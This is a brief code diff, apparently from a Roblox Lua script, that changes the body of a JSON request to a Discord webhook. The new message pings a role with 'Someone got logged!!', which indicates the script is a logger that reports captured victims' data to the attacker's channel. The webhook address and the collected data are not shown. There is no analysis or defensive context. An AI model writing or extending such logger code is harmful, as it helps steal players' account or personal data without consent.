@@ -62,5 +62,5 @@ local a= {
     Headers = {
         ['Content-Type'] = 'application/json';
     };
-    Body = game:GetService'HttpService':JSONEncode({['a'] = {embed}, ['content'] = '<@&1079413330206281848>'}),
+    Body = game:GetService'HttpService':JSONEncode({['embeds'] = {a}, ['content'] = ':bell: <@&1079413330206281848> Someone got logged!!'}),
 }
